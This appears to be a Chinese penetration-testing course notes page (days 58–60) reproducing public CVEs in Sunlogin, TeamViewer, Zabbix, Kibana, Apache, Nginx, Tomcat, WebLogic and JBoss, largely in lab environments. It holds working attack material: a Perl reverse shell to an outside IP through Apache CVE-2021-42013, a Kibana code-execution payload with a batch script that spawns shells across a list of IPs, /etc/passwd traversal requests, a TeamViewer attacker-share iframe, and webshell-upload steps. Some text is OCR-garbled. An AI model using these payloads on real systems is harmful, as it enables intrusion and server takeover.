<h4 id="协议漏同-应用软件-FTP-Proftpd搭建"><a href="#协议漏同-应用软件-FTP-Proftpd搭建" class="headerlink" title="协议漏同-应用软件-FTP&amp;Proftpd搭建"></a>协议漏同-应用软件-FTP&amp;Proftpd搭建</h4><p><a href="https://github.com/tokx/exploit-CVE-2015-3306">https://github.com/tokx/exploit-CVE-2015-3306</a><br>python exploit.py –host 123.58.236.76–port 24967–path “&#x2F;var&#x2F;www&#x2F;html&#x2F;”<br><a href="http://123:58.236:76.19758/backdoorphp?cmd=id">http://123:58.236:76.19758/backdoorphp?cmd=id</a></p>
<h4 id="协议漏洞-应用软件-SSH-libssh-Openssh"><a href="#协议漏洞-应用软件-SSH-libssh-Openssh" class="headerlink" title="协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh"></a>协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</h4><p>openssh CVE-2014-0160CVE-2018-15473cve202015778<br>CVE-2014-0160版本很少<br>cve_2020_15778价值不高（需要普通用户账号密码，可以返回shell但是权限仍是普通用户）<br>环境效果：不可以ssh连接，可以使用scp</p>
<p>CVE-2018-15473-用户名枚举<br><a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install-r requirements.txt</span><br><span class="line">pip3 install paramiko==2.4.1</span><br><span class="line">python sshUsernameEnumExploit.py –port 32013 –userList examplelnput.txt</span><br><span class="line">123.58.236.76</span><br></pre></td></tr></table></figure>

<h1 id="第58天-服务攻防-应用协议-设备Kibana-Zabbix-远控向日葵-VNC-TV"><a href="#第58天-服务攻防-应用协议-设备Kibana-Zabbix-远控向日葵-VNC-TV" class="headerlink" title="第58天 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV"></a>第58天 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV</h1><h4 id="知识点：-38"><a href="#知识点：-38" class="headerlink" title="知识点："></a>知识点：</h4><p>1、远程控制第三方应用安全<br>2、三方应用-向日葵&amp;VNC&amp;TV<br>3、设备平台-Zabbix&amp;Kibanai漏洞</p>
<h4 id="章节内容：-4"><a href="#章节内容：-4" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见版务应用的安全测试：<br>1、配置不当-未授权访问<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令侵破攻击</p>
<h4 id="前置知识：-7"><a href="#前置知识：-7" class="headerlink" title="前置知识："></a>前置知识：</h4><p>应用服务安全测试流程：见图<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式特定漏洞8未授权&amp;弱口令等</p>
<h4 id="演示案例：-34"><a href="#演示案例：-34" class="headerlink" title="演示案例："></a>演示案例：</h4><p>远程控制-向日葵&amp;Vnc&amp;Teamviewer<br>设备平台-Zabbix-CVE-2022-23131<br>设备平台-Kibana-CVE-2019-7609</p>
<h4 id="远程控制-向日葵-Vnc-Teamviewer"><a href="#远程控制-向日葵-Vnc-Teamviewer" class="headerlink" title="远程控制-向日葵&amp;Vnc&amp;Teamviewer"></a>远程控制-向日葵&amp;Vnc&amp;Teamviewer</h4><p>-向日葵RCE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Mr-xn/sunlogin_rce</span><br><span class="line">xrkRce.exe -h 192.168.46.157 -t scan</span><br><span class="line">xrkRce.exe -h 192.168.46.157-t rce-p 49712-c “ipconfig”</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令说明：</span><br><span class="line">-h 指定目标</span><br><span class="line">-t 选择扫描或者命令执行 默认scan</span><br><span class="line">-p 设置扫描端口范围 默认4w到65535</span><br><span class="line">-c 需要执行的命令</span><br></pre></td></tr></table></figure>

<p>-VNC口令问题&amp;未授权<br>MSF内置口令及未授权测试</p>
<p>-Teamviewer</p>
<blockquote>
<p>需要满足亮点两点：1、主机安装Teamviewer 2、管理员点击访问构造好的链接</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">stitle&gt;cv2020-13699/itle&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome to xiaodil<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;height:1px;width:1px;&quot;</span><span class="attr">src</span>=<span class="string">&#x27;teamviewer10:--play Wattacker-</span></span></span><br><span class="line"><span class="string"><span class="tag">IP\sharelfake.tvs&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="设备平台-Zabbix-CVE-2022-23131"><a href="#设备平台-Zabbix-CVE-2022-23131" class="headerlink" title="设备平台-Zabbix-CVE-2022-23131"></a>设备平台-Zabbix-CVE-2022-23131</h4><p>Zabbiⅸ是由Alexei Vladishev开发的一种网络监视、管理系统，基于Server-Client架构。<br>是一款服务器监控软件，其由server、.agent、,web等模块组成，其中web模块由PHP编<br>写，用来显示数据库中的结果。默认端口：10051红<br>Zabbix CVE-2022-23131登录绕过漏洞复现<br><a href="https://github.com/LOading-x/cve-2022-23131">https://github.com/LOading-x/cve-2022-23131</a><br>python3 zabbix.py target Admin<br>然后修改Cookie,使用saml登录即可<br>CVE-2017-2824CVE-2020-11800</p>
<p>获取权限后续利用：1、添加反弹shell脚本–2、服务器执行脚本–3、获取服务器权限</p>
<p>添加反弹shell脚本</p>
<p>找到服务器配置处</p>
<p>运行脚本</p>
<h4 id="设备平台-Kibana-CVE-2019-7609"><a href="#设备平台-Kibana-CVE-2019-7609" class="headerlink" title="设备平台-Kibana-CVE-2019-7609"></a>设备平台-Kibana-CVE-2019-7609</h4><p>Kibanai为Elassticsearch设计的一款开源的视图工具。其5.6.15和6.6.1之前的版本中存在一<br>处原型链污染漏洞，利用泥洞可以在目标服务器上执行任意代码。默认端口：5601<br><a href="https://github.com/LandGrey/CVE-2019-7609">https://github.com/LandGrey/CVE-2019-7609</a><br>es(*).props(label._proto_env.AAAA&#x3D;‘require(“child_process”).exec(“&#x2F;bin&#x2F;touch<br>&#x2F;tmp&#x2F;success”):process.exit（）&#x2F;&#x2F;).props(label._proto.env.NODE_OPTIONS&#x3D;’–require<br>&#x2F;proc&#x2F;self&#x2F;environ’)</p>
<p>脚本批量探测</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;ips.txt&#x27;</span>);</span><br><span class="line">	ip=ip.strip() <span class="comment">#换行符</span></span><br><span class="line">	cmdline=<span class="string">&#x27;D:\python2.7\python.exe CVE-2019-7605-kibana-rce.py -u %s -host 41.94.236.117 -port 5566 --shell&#x27;</span> %ip</span><br><span class="line">	os.system(cmdline)</span><br></pre></td></tr></table></figure>

<h1 id="第59天-服务攻防-中间件安全-CVE复现-lS-Apache-Tomcata-Nginx"><a href="#第59天-服务攻防-中间件安全-CVE复现-lS-Apache-Tomcata-Nginx" class="headerlink" title="第59天 服务攻防-中间件安全&amp;CVE复现&amp;lS&amp;Apache&amp;Tomcata&amp;Nginx"></a>第59天 服务攻防-中间件安全&amp;CVE复现&amp;lS&amp;Apache&amp;Tomcata&amp;Nginx</h1><h4 id="知识点：-39"><a href="#知识点：-39" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>1、中间件-IIS短文件&amp;解析&amp;蓝屏等<br>2、中间件-Nginx-文件解析&amp;命令执行等<br>3、中间件-Apache-RCE&amp;目录遍历&amp;文件解析等<br>4、中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等</p>
<h4 id="章节内容：-5"><a href="#章节内容：-5" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用框架特定安全漏洞</p>
<h4 id="前置知识：-8"><a href="#前置知识：-8" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全侧试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断仲间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞<br>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式持定漏洞&amp;未授权&amp;弱口令等</p>
<h4 id="演示案例：-35"><a href="#演示案例：-35" class="headerlink" title="演示案例："></a>演示案例：</h4><p>中间件IIS-短文件&amp;解析&amp;蓝屏等<br>中间件-Nginx-文件解析&amp;命令执行等<br>中间件-Apache-RCE&amp;目录遍历&amp;文件解析等<br>中间件。Tomcat-弱口令&amp;文件上传&amp;文件包含等<br>中间件-Apache RCE&amp;Fofa Viewer-走向高端啊</p>
<h4 id="中间件IIS短文件-解析-蓝屏等"><a href="#中间件IIS短文件-解析-蓝屏等" class="headerlink" title="中间件IIS短文件&amp;解析&amp;蓝屏等"></a>中间件IIS短文件&amp;解析&amp;蓝屏等</h4><blockquote>
<p>Internet Information Services（IIS，以前称为Internet Information Server）互联网信息服务是Microsoft公司提供的可扩展Web服务器，支持HTTP，HTTP&#x2F;2，HTTPS，FTP，FTPS，SMTP和NNTP等。起初用于Windows NT系列，随后内置在Windows 2000、Windows XP Professional、Windows Server 2003和后续版本一起发行，但在Windows XP Home版本上并没有IIS。IIS目前只适用于Windows系统，不适用于其他操作系统。</p>
</blockquote>
<p>1、短文件：信息收集 参考链接：<a href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a><br>2、文件解析：还有点用<br>3、HTTP.SYS:蓝屏崩溃<br>4、CVE-2017-7269条件过老<br>其他IIS漏洞参考：<a href="https://blog.csdn.net/qq_52486507/article/details/129863950">https://blog.csdn.net/qq_52486507/article/details/129863950</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS是Windows上的一个中间件，现在用到的已经算是比较少的了。</span><br></pre></td></tr></table></figure>

<h4 id="中间件-Nginx-文件解析-命令执行等"><a href="#中间件-Nginx-文件解析-命令执行等" class="headerlink" title="中间件-Nginx-文件解析&amp;命令执行等"></a>中间件-Nginx-文件解析&amp;命令执行等</h4><p>vulhub开启环境</p>
<p>上传图片文件–通过burp在文件中加入phpinfo()语句</p>
<p>访问图片，在图片后面加上 &#x2F;.php语句被成功解析并执行：</p>
<p>可利用此来上传木马，从而进行getshell<br>上传一句话木马</p>
<p>使用hackbar执行phpinfo();</p>
<h4 id="Nginx-文件名逻辑漏洞"><a href="#Nginx-文件名逻辑漏洞" class="headerlink" title="Nginx 文件名逻辑漏洞"></a>Nginx 文件名逻辑漏洞</h4><p>漏洞原理：</p>
<blockquote>
<p>主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p>
</blockquote>
<p>vulhub启动环境：</p>
<p>上传gif图片文件，通过burp抓包插入pnpinfo();<br>然后在文件名后缀加入空格</p>
<p>再用过浏览器访问上传图片后返回的文件路径，因为在文件名后加了空格所以直接访问不到<br>再抓包在文件名后加两个空格和.php(&#x2F;uploadfiles&#x2F;1.jpg )–然后修改空格16进制为00</p>
<p>最后返回PHP info内容</p>
<h4 id="中间件-Apache-RCE-目录遍历-文件解析等"><a href="#中间件-Apache-RCE-目录遍历-文件解析等" class="headerlink" title="中间件-Apache-RCE&amp;目录遍历&amp;文件解析等"></a>中间件-Apache-RCE&amp;目录遍历&amp;文件解析等</h4><p>Apache HTTP Server是美国阿帕奇(Apache)基金会的一款开源网页服务器。该服务器<br>具有快速、可靠且可通过简单的API进行扩充的特点，发现Apache HTTP Server2.4.50<br>中针对CVE-2021-41773的修复不够充分。攻击者可以使用路径遍历攻击将URL映射到<br>由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置<br>要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了CG引脚<br>本，则这可能允许远程代码执行。此问题仅影响Apache2.4.49和Apache2.4.50,而不<br>影响更早版本。</p>
<h6 id="1、Cve-2021-42013RCE"><a href="#1、Cve-2021-42013RCE" class="headerlink" title="1、Cve-2021-42013RCE"></a>1、Cve-2021-42013RCE</h6><p>P0ST &#x2F;cgi-bin.%%32%651.%%32%65&#x2F;.%%32%651.%%32%65bin&#x2F;sh<br>echo;perl -e ‘use Socket:Si&#x3D;“47.94.236.117”;<br>Sp&#x3D;5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,socka<br>ddr_in(Sp,inet_aton(Si))))<br>[open(STDIN,“&gt;&amp;S”):open(STDOUT,“&gt;&amp;S”);open(STDERR,“&gt;&amp;S”):exec(&#x2F;bin&#x2F;sh -i”)😉</p>
<p>使用.%%32%65进行绕过（注意其中的&#x2F;icons&#x2F;必须是一个存在且可访问的目录）：</p>
<p>可见，成功读取到&#x2F;etc&#x2F;passwd：</p>
<p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v --data &quot;echo;id&quot; &#x27;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<h6 id="2、CVE-2021-41773目录穿越"><a href="#2、CVE-2021-41773目录穿越" class="headerlink" title="2、CVE-2021-41773目录穿越"></a>2、CVE-2021-41773目录穿越</h6><p>Apache HTTP Server2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏<br>洞，攻击者可利用该漏洞读取到Wb目录外的其他文件，如系统配置文件、网站源码等，<br>甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。<br>Burp:ic0ns&#x2F;.%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%<br>%32%65&#x2F;etc&#x2F;passwd</p>
<h6 id="3、Cve-2017-15715文件解析"><a href="#3、Cve-2017-15715文件解析" class="headerlink" title="3、Cve-2017-15715文件解析"></a>3、Cve-2017-15715文件解析</h6><p>Apache HTTPD:是一款HTTP服务器。其2.4.0~2.4.29版本存在一个解析漏洞，在解析PHP<br>时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策路。</p>
<p>Cve-2017-15715文件解析漏洞复现：</p>
<p>启动环境</p>
<p>在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截<br>注意添加的位置，可以先手动在文件名后加空格，然后切换到16进制将20改为0a。</p>
<p>访问刚才上传的&#x2F;evil.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：</p>
<p>4、Cve2017-9798价值不高<br>5、Cve_2018_11759价值不高I<br>6、Cve_2021-37580插件问题</p>
<h4 id="中间件Tomcat-弱口令-文件上传-文件包含等"><a href="#中间件Tomcat-弱口令-文件上传-文件包含等" class="headerlink" title="中间件Tomcat-.弱口令&amp;文件上传&amp;文件包含等"></a>中间件Tomcat-.弱口令&amp;文件上传&amp;文件包含等</h4><p>简介：</p>
<blockquote>
<p>Tomcat是Apache软件基金会（Apache Software Foundation）的Jakarta项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java爱好者的喜爱并得到了部分软件开发商的认可，成为比较流行的Web 应用服务器。</p>
</blockquote>
<h6 id="1、弱口令猜解"><a href="#1、弱口令猜解" class="headerlink" title="1、弱口令猜解"></a>1、弱口令猜解</h6><p>配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell</p>
<h5 id="弱口令漏洞复现"><a href="#弱口令漏洞复现" class="headerlink" title="弱口令漏洞复现"></a>弱口令漏洞复现</h5><p>vulhub启动环境：</p>
<p>访问ip:8080 点击Manager APP登录，弱口令为tomcat&#x2F;tomcat</p>
<p>getshell：首先使用哥斯拉生成jsp后门，然后将jsp文件压缩为zip文件，再通过修改后缀的方式改为.war文件</p>
<p>在tomcat上传点上传war文件，通过返回信息查看上传状态</p>
<p>访问<a href="http://192.168.74.132/222/222.jsp">http://192.168.74.132/222/222.jsp</a> 文件存在 ，使用哥斯拉连接获得服务器权限</p>
<h6 id="2、CVE-2017-12615文件上传"><a href="#2、CVE-2017-12615文件上传" class="headerlink" title="2、CVE-2017-12615文件上传"></a>2、CVE-2017-12615文件上传</h6><p>当存在漏洞的Tomcati运行在Nindows&#x2F;Linux主机上，且启用了HTTP PUT请求方法（例<br>如，将readonly初始化参数由默认值设置为false),攻击者将有可能可通过精心构造的<br>攻击情求数据包向服务器上传包含任意代码的JSP的webshell文件，JSP文件中的恶意代码<br>将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。<br>影响版本Apache Tomcat7.0.0-7.0.79<br>PUT &#x2F;1.jsp&#x2F;HTTP&#x2F;1.1<br>shell代码</p>
<h6 id="3、cve-2020-1938文件包含（脚本执行）"><a href="#3、cve-2020-1938文件包含（脚本执行）" class="headerlink" title="3、cve-2020-1938文件包含（脚本执行）"></a>3、cve-2020-1938文件包含（脚本执行）</h6><p>Apache Tomcat AJP协议(默认8009端口)由于存在实现缺陷导致相关参数可控，攻击者<br>利用该漏洞可通过构造特定参数，读取服务器vebapp目录下的任意文件。若服务器端同时<br>存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。<br>漏洞影响的产品版本包括：<br>Tomcat 6].*<br>Tomcat7.&lt;7.0.100<br>Tomcat8.&lt;8.5.51<br>Tomcat9.*&lt;9.0.31<br><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a><br>D:\Python27\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76-p 63667-f<br>WEB-INF&#x2F;web.xml</p>
<h6 id="4、Cve202011996拒绝服务"><a href="#4、Cve202011996拒绝服务" class="headerlink" title="4、Cve202011996拒绝服务"></a>4、Cve202011996拒绝服务</h6><p>危害过大，权限无关，意义不大</p>
<h6 id="5、Cve20209484反序列化"><a href="#5、Cve20209484反序列化" class="headerlink" title="5、Cve20209484反序列化"></a>5、Cve20209484反序列化</h6><p>利用条件太司刻，意义不大</p>
<h4 id="中间件-Fofaviewer-Apache-RCE-走向高端啊"><a href="#中间件-Fofaviewer-Apache-RCE-走向高端啊" class="headerlink" title="中间件-Fofaviewer&amp;Apache_RCE-走向高端啊"></a>中间件-Fofaviewer&amp;Apache_RCE-走向高端啊</h4><p>server&#x3D;“Apache&#x2F;2.4.49”<br>视频中未进行演示推测具体的流程为：<br>1、使用fofaview进行目标资产收集<br>2、编写python脚本进行批量化漏洞探测</p>
<h1 id="第60天-服务攻防-中间件安全-CVE复现-Weblogic-Jenkins-GlassFish"><a href="#第60天-服务攻防-中间件安全-CVE复现-Weblogic-Jenkins-GlassFish" class="headerlink" title="第60天 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish"></a>第60天 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish</h1><h4 id="知识点：-40"><a href="#知识点：-40" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>1、<strong>中间件-Weblogic安全</strong>            ———–感觉其中最重要的一个<br>2、中间件JB00S安全<br>3、中间件-Jenkins:安全<br>4、中间件-GlassFish安全</p>
<h4 id="章节内容：-6"><a href="#章节内容：-6" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用框架特定安全漏洞</p>
<h4 id="前置知识：-9"><a href="#前置知识：-9" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全侧试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断仲间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞<br>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式持定漏洞&amp;未授权&amp;弱口令等</p>
<h4 id="演示案例-2"><a href="#演示案例-2" class="headerlink" title="演示案例"></a>演示案例</h4><p>中间件Weblogic-工具搜哈<br>中间件JBoos-工具脚本搜哈<br>中间件-Jenkins-工具脚本搜哈<br>中间件-GlassFish-工具脚本搜哈<br>配合下-FofaViewer-.工具脚本搜哈</p>
<h5 id="1、中间件-Weblogic-CVE-反序列化-远程执行"><a href="#1、中间件-Weblogic-CVE-反序列化-远程执行" class="headerlink" title="1、中间件-Weblogic-CVE&amp;反序列化&amp;远程执行"></a>1、中间件-Weblogic-CVE&amp;反序列化&amp;远程执行</h5><p>​        简介：Weblogic 是 Oracle 公司推出的一个基于JAVAEE架构的中间件，能为JAVA程序提供开发、集成、部署和管理等功能。</p>
<p>注：由于下面的几个漏洞大部分可直接用集成工具一键探测并利用，因此下面只介绍漏洞详情，就不复现了，下载链接如下：</p>
<p>WeblogicTool-GUI漏洞利用工具<a href="https://github.com/KimJun1010/WeblogicTool">https://github.com/KimJun1010/WeblogicTool</a> ，支持漏洞检测、命令执行、内存马注入、密码解密等</p>
<p>此工具需要在java8环境下运行，检查java版本</p>
<h6 id="（1）-CVE-2017-3506-远程代码执行漏洞"><a href="#（1）-CVE-2017-3506-远程代码执行漏洞" class="headerlink" title="（1） CVE-2017-3506  远程代码执行漏洞"></a>（1） CVE-2017-3506  远程代码执行漏洞</h6><p>简介：</p>
<pre><code>    Weblogic的WLS Security组件对外提供webservice服务 ，里面的XMLDecoder是用来解析用户传入的数据，解析的过程中，由于其中的WorkContextXmlInputAdapter类没有限制传入的数据，会出现反序列化漏洞，导致可执行任意命令，因此可被攻击者构造恶意代码拿到权限。
</code></pre>
<p>影响版本：</p>
<pre><code>    OracleWebLogic Server10.3.6.0.0

    OracleWebLogic Server12.1.3.0.0

    OracleWebLogic Server12.2.1.1.0

    OracleWebLogic Server12.2.1.2.0
</code></pre>
<p>判断方法：</p>
<pre><code>    访问以下目录，页面有返回服务信息则说明或许存在漏洞
</code></pre>
<blockquote>
<p>&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</p>
<p>&#x2F;wls-wsat&#x2F;ParticipantPortType</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType<br>&#x2F;wls-wsat&#x2F;CoordinatorPortType11</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11<br>&#x2F;wls-wsat&#x2F;ParticipantPortType11</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11</p>
</blockquote>
<h6 id="（2）CVE-2018-2893-反序列化漏洞"><a href="#（2）CVE-2018-2893-反序列化漏洞" class="headerlink" title="（2）CVE-2018-2893  反序列化漏洞"></a>（2）CVE-2018-2893  反序列化漏洞</h6><p>简介：</p>
<pre><code>    此漏洞产生于WebLogic T3服务，T3协议在WebLogic Server和客户端间承当传输数据和通信作用，Weblogic开放端口后T3会默认开启，WebLogic服务存在的漏洞允许未经身份验证的攻击者通过T3获得服务器权限。
</code></pre>
<p>影响版本：</p>
<pre><code>    WebLogic 10.3.6.0

    WebLogic 12.1.3.0

    WebLogic 12.2.1.2

    WebLogic 12.2.1.3
</code></pre>
<h6 id="（3）CVE-2018-3245-远程代码执行漏洞"><a href="#（3）CVE-2018-3245-远程代码执行漏洞" class="headerlink" title="（3）CVE-2018-3245  远程代码执行漏洞"></a>（3）CVE-2018-3245  远程代码执行漏洞</h6><p>简介：</p>
<pre><code>    该漏洞和CVE-2018-2893类似，通过JRMP协议利用RMI机制的缺陷,进行远程代码执行漏洞的利用。攻击者可构造恶意代码并通过T3进行反序列化实现远程代码执行获取系统权限。
</code></pre>
<p>影响版本：</p>
<pre><code>    Weblogic 10.3.6.0

    Weblogic 12.1.3.0

    Weblogic 12.2.1.3
</code></pre>
<p>判断方法：</p>
<pre><code>    CVE-2018-3245-PoC
</code></pre>
<h6 id="（4）CVE-2020-14882-未授权命令执行漏洞"><a href="#（4）CVE-2020-14882-未授权命令执行漏洞" class="headerlink" title="（4）CVE-2020-14882 未授权命令执行漏洞"></a>（4）CVE-2020-14882 未授权命令执行漏洞</h6><p>简介：</p>
<pre><code>    此漏洞可被未经身份验证的攻击者通过构造特殊的GET请求进行攻击，
</code></pre>
<p>影响版本：</p>
<pre><code>    Oracle Weblogic Server 10.3.6.0.0

    Oracle Weblogic Server 12.1.3.0.0

    Oracle Weblogic Server 12.2.1.3.0

    Oracle Weblogic Server 12.2.1.4.0

    Oracle Weblogic Server 14.1.1.0.0
</code></pre>
<p>WeblogicTool可以识别存在漏洞，但是利用这块用不了，尝试手工复现下</p>
<p>打开vulhub，进入&#x2F;weblogic&#x2F;CVE-2020-14882，启动容器</p>
<p>打开访问界面<a href="http://192.168.190.153:7001/console">http://192.168.190.153:7001/console</a></p>
<p>输入poc，可直接进入后台,说明存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个在最近打的一个渗透靶场中也出现了好几题相关的题目，虽然可以绕过直接进入后台，但只是低权限用户，并没有什么太大作用，主要漏洞点一般情况下载另一个界面中的ssrf漏洞</span><br><span class="line">http://175.27.135.16:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=127.0.0.1:7000</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://cloud.tencent.com/developer/article/2202740">https://cloud.tencent.com/developer/article/2202740</a> </p>
<h6 id="（5）CVE-2021-2394-反序列化漏洞"><a href="#（5）CVE-2021-2394-反序列化漏洞" class="headerlink" title="（5）CVE-2021-2394 反序列化漏洞"></a>（5）CVE-2021-2394 反序列化漏洞</h6><p>简介：</p>
<pre><code>    此为WebLogic组件存在高危漏洞，漏洞主要是FilterExtractor的readExternal方法使用不当，使得生成 MethodAttributeAccessor的时候不会受到黑名单的限制。成功利用该漏洞的攻击者可以获取WebLogic Server管理权限。
</code></pre>
<p>影响版本：</p>
<pre><code>    Oracle WebLogic Server 10.3.6.0.0

    Oracle WebLogic Server 12.1.3.0.0

    Oracle WebLogic Server 12.2.1.3.0

    Oracle WebLogic Server 12.2.1.4.0

    Oracle WebLogic Server 14.1.1.0.0
</code></pre>
<p>这里用vulhub的CVE-2020-14882的漏洞环境来代替（版本一致）</p>
<p>可以直接使用工具去连接存在漏洞的页面，从而直接可以达到命令执行的效果。</p>
<h5 id="2、中间件-JBoos-CVE-弱口令"><a href="#2、中间件-JBoos-CVE-弱口令" class="headerlink" title="2、中间件-JBoos-CVE&amp;弱口令"></a>2、中间件-JBoos-CVE&amp;弱口令</h5><p>简介：</p>
<pre><code>    Jboss 通常占用的端口是 1098，1099，4444，4445，8080，8009，8083，8093 这
</code></pre>
<p>几个，Red Hat JBoss Application Server 是一款基于 JavaEE 的开源应用服务器。</p>
<p>（1）CVE-2017-12149  反序列化远程代码执行漏洞</p>
<p>简介：</p>
<pre><code>    JBOSS Application Server是一个基于JE22的开放源代码的应用服务器，在这个漏洞中，发现 HTTP Invoker 的 ReadOnlyAccessFilter 中的 doFilter 方法不限制它执行反序列化的类，因此允许攻击者通过构建特殊的的序列化数据执行任意代码，无需用户验证即可获得服务器的控制权。
</code></pre>
<p>影响版本：</p>
<pre><code>    5.x和6.x版本的JBOSSAS
</code></pre>
<h6 id="（2）CVE-2017-7504-反序列化命令执行漏洞"><a href="#（2）CVE-2017-7504-反序列化命令执行漏洞" class="headerlink" title="（2）CVE-2017-7504  反序列化命令执行漏洞"></a>（2）CVE-2017-7504  反序列化命令执行漏洞</h6><p>简介：</p>
<pre><code>    Jboss AS 4.X及之前的版本中的JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在安全漏洞。远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
</code></pre>
<p>影响版本：</p>
